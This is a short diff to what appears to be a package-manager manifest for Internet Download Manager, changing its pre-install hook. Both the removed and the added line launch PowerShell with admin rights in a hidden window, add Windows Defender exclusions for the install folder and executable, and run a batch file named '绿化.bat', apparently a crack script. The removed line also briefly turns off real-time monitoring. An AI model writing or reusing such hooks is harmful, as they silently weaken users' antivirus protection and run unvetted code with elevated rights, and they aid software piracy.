@@ -6,7 +6,7 @@
 	"hash": "md5:e52c953ccc528eca82bf17cc99d2e1f5",
 	"extract_dir": "IDM/Bin",
 	"pre_install": [
-		"Start-Process powershell \"Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionPath $dir;Add-MpPreference -ExclusionPath $dir\\IDMan.exe;$dir\\``!``)绿化.bat;Set-MpPreference -DisableRealtimeMonitoring 0\" -Verb RunAs -WindowStyle hidden -wait"
+		"Start-Process powershell \"Add-MpPreference -ExclusionPath $dir;Add-MpPreference -ExclusionPath $dir\\IDMan.exe;$dir\\``!``)绿化.bat\" -Verb RunAs -WindowStyle hidden -wait"
 		
 	],
 	"uninstaller": {
